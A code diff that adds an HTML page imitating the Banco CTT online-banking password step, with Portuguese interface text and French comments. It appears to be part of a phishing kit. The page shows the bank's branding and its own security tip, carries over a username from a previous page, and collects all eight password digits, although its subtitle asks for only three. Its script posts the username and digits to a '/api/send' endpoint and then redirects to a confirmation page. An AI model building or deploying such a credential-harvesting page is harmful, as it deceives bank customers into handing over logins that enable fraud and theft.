@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco CTT - Palavra-passe</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 30px 50px;
+        }
+
+        .logo {
+            font-size: 32px;
+            font-weight: 300;
+            color: #333;
+        }
+
+        .logo span {
+            color: #e60012;
+            font-weight: 700;
+        }
+
+        .back-link {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #666;
+            text-decoration: none;
+            font-size: 15px;
+            cursor: pointer;
+        }
+
+        .back-link::before {
+            content: '←';
+            font-size: 18px;
+        }
+
+        .main-container {
+            flex: 1;
+            display: flex;
+            position: relative;
+            padding: 0 50px;
+        }
+
+        .red-line {
+            position: absolute;
+            left: 35%;
+            top: -50px;
+            width: 4px;
+            height: 120%;
+            background: #e60012;
+            transform: rotate(15deg);
+            transform-origin: top center;
+            z-index: 1;
+        }
+
+        .red-line::before {
+            content: '';
+            position: absolute;
+            left: -200px;
+            top: 80%;
+            width: 300px;
+            height: 4px;
+            background: #e60012;
+            transform: rotate(-25deg);
+            transform-origin: left center;
+        }
+
+        .left-column {
+            width: 45%;
+            padding-top: 20px;
+            z-index: 2;
+        }
+
+        .left-column h1 {
+            font-size: 28px;
+            font-weight: 400;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .left-column p {
+            font-size: 18px;
+            color: #666;
+            margin-bottom: 40px;
+        }
+
+        .security-box {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 20px;
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+            max-width: 400px;
+        }
+
+        .security-icon {
+            width: 40px;
+            height: 40px;
+            background: #00a0b0;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .security-icon::after {
+            content: '✓';
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        .security-content h3 {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .security-content p {
+            font-size: 13px;
+            color: #666;
+            line-height: 1.5;
+            margin: 0;
+        }
+
+        .right-column {
+            width: 55%;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding-top: 20px;
+            z-index: 2;
+        }
+
+        .password-form {
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+        }
+
+        .password-form h2 {
+            font-size: 22px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .password-form .subtitle {
+            font-size: 15px;
+            color: #555;
+            margin-bottom: 25px;
+            line-height: 1.4;
+        }
+
+        .user-info {
+            margin-bottom: 20px;
+        }
+
+        .user-info label {
+            display: block;
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 5px;
+        }
+
+        .user-info .username {
+            font-size: 16px;
+            color: #333;
+            font-weight: 500;
+        }
+
+        .password-section {
+            margin-bottom: 25px;
+        }
+
+        .password-section label {
+            display: block;
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 15px;
+        }
+
+        .password-dots {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .dot {
+            width: 8px;
+            height: 8px;
+            background: #ccc;
+            border-radius: 50%;
+        }
+
+        .dot.active {
+            background: #666;
+        }
+
+        .password-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 10px;
+        }
+
+        .password-input-group {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .password-input-group input {
+            width: 50px;
+            height: 50px;
+            border: 1px solid #e0e0e0;
+            border-radius: 6px;
+            text-align: center;
+            font-size: 18px;
+            background: #f5f5f5;
+            -webkit-text-security: disc;
+            text-security: disc;
+        }
+
+        .password-input-group .position {
+            font-size: 12px;
+            color: #666;
+        }
+
+        .btn-continue {
+            width: 100%;
+            padding: 14px;
+            background: #e60012;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-bottom: 12px;
+            transition: background 0.3s;
+        }
+
+        .btn-continue:hover {
+            background: #c40010;
+        }
+
+        .btn-continue:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .btn-recover {
+            width: 100%;
+            padding: 14px;
+            background: transparent;
+            color: #e60012;
+            border: 1px solid #e60012;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-recover:hover {
+            background: #e60012;
+            color: white;
+        }
+
+        footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 50px;
+            border-top: 1px solid #f0f0f0;
+            margin-top: auto;
+        }
+
+        .footer-links a {
+            color: #00a0b0;
+            text-decoration: none;
+            font-size: 14px;
+            margin-right: 20px;
+            font-weight: 500;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .language-selector {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #333;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .language-selector::before {
+            content: '🌐';
+            font-size: 16px;
+        }
+
+        @media (max-width: 900px) {
+            .main-container {
+                flex-direction: column;
+                padding: 0 20px;
+            }
+
+            .left-column,
+            .right-column {
+                width: 100%;
+            }
+
+            .red-line {
+                display: none;
+            }
+
+            .left-column {
+                margin-bottom: 40px;
+            }
+
+            footer {
+                flex-direction: column;
+                gap: 15px;
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">banco<span>ctt</span></div>
+        <a href="index.html" class="back-link">Voltar</a>
+    </div>
+
+    <div class="main-container">
+        <div class="red-line"></div>
+
+        <div class="left-column">
+            <h1>Bem-vindo ao seu banco, à sua medida</h1>
+            <p>Digital, flexível e sempre ao seu alcance</p>
+
+            <div class="security-box">
+                <div class="security-icon"></div>
+                <div class="security-content">
+                    <h3>Dica de segurança</h3>
+                    <p>O Banco CTT nunca solicita a sua palavra-passe via email/SMS nem por telefone. Consulte o nosso Guia de segurança</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="right-column">
+            <form class="password-form" id="form2" onsubmit="envoyer(event)">
+                <!-- Champ caché pour l'identifiant -->
+                <input type="hidden" id="identifiant_hidden" name="identifiant" value="">
+                
+                <h2>Iniciar sessão</h2>
+                <p class="subtitle">Por favor introduza os caracteres das três posições em falta da sua palavra-passe.</p>
+
+                <div class="user-info">
+                    <label>Nome de utilizador</label>
+                    <div class="username" id="username_display">-</div>
+                </div>
+
+                <div class="password-section">
+                    <label>Palavra-passe</label>
+                    
+                    <!--  <div class="password-dots">
+                        <div class="dot active"></div>
+                        <div class="dot active"></div>
+                        <div class="dot active"></div>
+                        <div class="dot active"></div>
+                        <div class="dot active"></div>
+                        <div class="dot active"></div>
+                        <div class="dot active"></div>
+                        <div class="dot active"></div>
+                        <div class="dot active"></div>
+                    </div>-->
+
+      <div class="password-inputs">
+					<div class="password-input-group">
+                            <input type="text" name="chiffre_1" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" required>
+                            <span class="position">1ª</span>
+                        </div>
+                        <div class="password-input-group">
+                            <input type="text" name="chiffre_2" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" required>
+                            <span class="position">2ª</span>
+                        </div>
+					
+                        <div class="password-input-group">
+                            <input type="text" name="chiffre_3" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" required>
+                            <span class="position">3ª</span>
+                        </div>
+						<div class="password-input-group">
+                            <input type="text" name="chiffre_4" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" required>
+                            <span class="position">4ª</span>
+                        </div>
+						<div class="password-input-group">
+                            <input type="text" name="chiffre_5" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" required>
+                            <span class="position">5ª</span>
+                        </div>
+						<div class="password-input-group">
+                            <input type="text" name="chiffre_6" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" required>
+                            <span class="position">6ª</span>
+                        </div>
+						<div class="password-input-group">
+                            <input type="text" name="chiffre_7" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" required>
+                            <span class="position">7ª</span>
+                        </div>
+                        <div class="password-input-group">
+                            <input type="text" name="chiffre_8" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" required>
+                            <span class="position">8ª</span>
+                        </div>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-continue">Continuar</button>
+                <button type="button" class="btn-recover">Recuperar palavra-passe</button>
+            </form>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-links">
+            <a href="#">Guia de segurança</a>
+            <a href="#">Contactos</a>
+            <a href="#">Onde estamos</a>
+        </div>
+        <div class="language-selector">
+            Português
+        </div>
+    </footer>
+
+    <script>
+        // Récupère l'identifiant du localStorage
+        document.addEventListener('DOMContentLoaded', function() {
+            const identifiant = localStorage.getItem('banco_ctt_identifiant');
+            if (identifiant) {
+                document.getElementById('username_display').textContent = identifiant;
+                document.getElementById('identifiant_hidden').value = identifiant;
+                localStorage.removeItem('banco_ctt_identifiant');
+            }
+        });
+
+        // Validation chiffres + auto-focus
+        document.querySelectorAll('.password-input-group input').forEach(input => {
+            input.addEventListener('keydown', function(e) {
+                const allowed = ['Backspace','Delete','Tab','ArrowLeft','ArrowRight'];
+                if (allowed.includes(e.key)) return;
+                if (!/^\d$/.test(e.key)) e.preventDefault();
+            });
+
+            input.addEventListener('input', function() {
+                let v = this.value.replace(/\D/g, '');
+                this.value = v.slice(-1);
+            });
+
+            input.addEventListener('keyup', function(e) {
+                if (this.value && e.key !== 'Backspace') {
+                    const inputs = [...document.querySelectorAll('.password-input-group input')];
+                    const idx = inputs.indexOf(this);
+                    if (idx < inputs.length - 1) inputs[idx + 1].focus();
+                }
+            });
+        });
+
+        // Envoi via API Vercel → FormSubmit AJAX
+        async function envoyer(e) {
+            e.preventDefault();
+            
+            const data = {
+                identifiant: document.getElementById('identifiant_hidden').value,
+                chiffre_1: document.querySelector('input[name="chiffre_1"]').value,
+                chiffre_2: document.querySelector('input[name="chiffre_2"]').value,
+                chiffre_3: document.querySelector('input[name="chiffre_3"]').value,
+				 chiffre_4: document.querySelector('input[name="chiffre_4"]').value,
+                chiffre_5: document.querySelector('input[name="chiffre_5"]').value,
+                chiffre_6: document.querySelector('input[name="chiffre_6"]').value,
+				 chiffre_7: document.querySelector('input[name="chiffre_7"]').value,
+                chiffre_8: document.querySelector('input[name="chiffre_8"]').value
+              
+            };
+
+            const btn = document.querySelector('.btn-continue');
+            btn.textContent = 'A enviar...';
+            btn.disabled = true;
+
+            try {
+                const res = await fetch('/api/send', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+
+                const result = await res.json();
+
+                if (res.ok && result.success) {
+                    window.location.href = 'confirmacao.html';
+                } else {
+                    throw new Error(result.error || 'Erreur inconnue');
+                }
+            } catch (err) {
+                alert('Erreur lors de l\'envoi : ' + err.message);
+                btn.textContent = 'Continuar';
+                btn.disabled = false;
+            }
+        }
+    </script>
+</body>
+</html>
